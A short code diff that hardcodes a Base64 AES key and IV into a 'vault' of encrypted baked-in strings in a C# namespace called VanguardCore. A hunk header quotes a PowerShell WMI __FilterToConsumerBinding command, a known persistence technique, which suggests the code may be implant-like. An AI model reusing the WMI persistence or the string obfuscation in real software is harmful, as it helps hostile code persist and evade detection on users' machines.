@@ -172,8 +172,8 @@ namespace VanguardCore
 
         // --- Secure Vault for Baked-in Strings (Vault 2.0) ---
         private struct VaultEntry { public string C; public string T; }
-        private static byte[]? VAULT_KEY;
-        private static byte[]? VAULT_IV;
+        private static byte[] VAULT_KEY = Convert.FromBase64String("8YIpkDwId8w6GZCCEFDiQeYgrURN7GHiF7fZRNO4GIY=");
+        private static byte[] VAULT_IV = Convert.FromBase64String("ch6l8u+6OyCx3Cj7");
         
         private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>
         {
@@ -2087,4 +2087,9 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
         }
     }
 }
+
+
+
+
+
 
